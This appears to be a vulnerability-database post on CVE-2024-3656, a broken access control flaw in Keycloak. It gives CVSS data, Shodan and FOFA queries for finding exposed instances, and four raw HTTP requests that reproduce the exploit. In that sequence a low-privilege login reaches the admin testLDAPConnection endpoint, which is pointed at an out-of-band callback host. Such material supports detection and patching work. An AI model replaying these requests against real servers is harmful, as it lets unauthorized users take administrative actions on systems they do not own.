---
layout: "post"
cve_id: "CVE-2024-3656"
title: "Keycloak < 24.0.5 - Broken Access Control"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-3656.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-3656.yaml"
author: "iamnoooob,rootxharsh,pdresearch"
severity: "high"
reference:
  - "https://cn-sec.com/archives/3262467.html"
  - "https://github.com/advisories/GHSA-2cww-fgmg-4jqc"
  - "https://access.redhat.com/errata/RHSA-2024:3575"
  - "https://access.redhat.com/security/cve/CVE-2024-3656"
  - "https://bugzilla.redhat.com/show_bug.cgi?id=2274403"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
  cvss-score: 8.1
  cve-id: "CVE-2024-3656"
  cwe-id: "CWE-200"
  epss-score: 0.89502
  epss-percentile: 0.99523
metadata:
  verified: True
  max-request: 5
  vendor: "redhat"
  product: "keycloak"
  shodan-query: ['http.favicon.hash:"-1105083093"', 'http.html:"keycloak"', 'http.title:"keycloak"']
  fofa-query: ['icon_hash=-1105083093', 'body="keycloak"', 'title="keycloak"']
  google-query: "intitle:\"keycloak\""
tags:
  - "cve"
  - "cve2024"
  - "keycloak"
  - "auth-bypass"
  - "authenticated"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## ðŸ” Vulnerability Description
A flaw was found in Keycloak. Certain endpoints in Keycloak's admin REST API allow low-privilege users to access administrative functionalities. This flaw allows users to perform actions reserved for administrators, potentially leading to data breaches or system compromise.


## ðŸŒ HTTP Request
```nohighlight
GET /realms/master/protocol/openid-connect/auth?client_id=security-admin-console&redirect_uri=http%3A%2F%2fwww.victim.com%2Fadmin%2Fmaster%2Fconsole%2F&state=1&response_mode=query&response_type=code&scope=openid&nonce=1&code_challenge_method=S256&code_challenge=wMYxCiAZ5DmiZvqD0h5G_9QwE7IDDFRojvORiaqiTto HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.12
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /realms/master/login-actions/authenticate?client_id=security-admin-console&tab_id=Fjy8C1&client_data=eyJydCI6ImNvZGUiLCJybSI6InF1ZXJ5Iiwic3QiOiIxIn0= HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /realms/master/protocol/openid-connect/token HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/91.0
Connection: close
Content-Length: 257
Content-type: application/x-www-form-urlencoded
Accept-Encoding: gzip

code=gXQQUt&grant_type=authorization_code&client_id=security-admin-console&redirect_uri=http%3A%2F%2Fwww.victim.com%2Fadmin%2Fmaster%2Fconsole%2F&code_verifier=7BhCLfrzYxLzq3XzrfiA8TplZBDciJ0RZepiiDujJKwOaMDzMZWcqGvrCfYH6s735tzxteIUH1vWLP1D2xXm88O9XFEnxcx2&
```

```nohighlight
POST /admin/realms/master/testLDAPConnection HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Connection: close
Content-Length: 267
authorization: Bearer 0SYnHh
content-type: application/json
Accept-Encoding: gzip

{
    "action": "testConnection",
    "connectionUrl": "ldap://d4t8a2ple0o0mi1895mg5cfbddhjqpjfr.oast.online/",
    "bindDn": "cn=admin,dc=example,dc=com",
    "bindCredential": "password",
    "useTruststoreSpi": "ldapsOnly",
    "connectionTimeout": "5000"
}
```


